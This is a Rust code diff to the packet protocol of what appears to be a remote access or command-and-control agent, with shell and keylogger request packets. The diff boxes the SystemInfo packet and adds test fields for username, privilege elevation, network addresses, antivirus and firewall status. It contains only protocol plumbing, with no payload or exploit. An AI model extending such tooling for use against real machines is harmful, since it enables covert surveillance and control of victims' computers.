@@ -17,7 +17,7 @@ pub enum Packets {
     Heartbeat(Heartbeat),
     AgentAuth(AgentAuth),
     AgentAuthResponse(AgentAuthResponse),
-    SystemInfo(SystemInfo),
+    SystemInfo(Box<SystemInfo>),
     AgentControl(AgentControl),
     ShellRequest(ShellRequest),
     KeyloggerRequest(KeyloggerRequest),
@@ -73,7 +73,7 @@ pub fn from_packet_bytes(data: &[u8]) -> Result<Packets, PacketError> {
         0x09 => Ok(Packets::AgentAuthResponse(AgentAuthResponse::deserialize(
             data,
         )?)),
-        0x0A => Ok(Packets::SystemInfo(SystemInfo::deserialize(data)?)),
+        0x0A => Ok(Packets::SystemInfo(Box::new(SystemInfo::deserialize(data)?))),
         0x0B => Ok(Packets::AgentControl(AgentControl::deserialize(data)?)),
         0x0C => Ok(Packets::ShellRequest(ShellRequest::deserialize(data)?)),
         0x0D => Ok(Packets::KeyloggerRequest(KeyloggerRequest::deserialize(
@@ -162,7 +162,10 @@ mod tests {
         let pkt = SystemInfo {
             hostname: "h".to_string(), os_name: "o".to_string(), os_version: "v".to_string(),
             cpu_name: "c".to_string(), cpu_count: 1, total_memory_bytes: 1, used_memory_bytes: 1,
-            uptime_secs: 1,
+            uptime_secs: 1, agent_version: "1.0.0".to_string(), gpu_name: None,
+            username: "user".to_string(), is_elevated: false, arch: "x86_64".to_string(),
+            locale: None, local_ips: vec![], mac_address: None, domain: None,
+            total_disk_bytes: 0, used_disk_bytes: 0, antivirus: vec![], firewall_enabled: None,
         };
         let bytes = to_wire(&pkt);
         assert!(matches!(from_packet_bytes(&bytes), Ok(Packets::SystemInfo(_))));
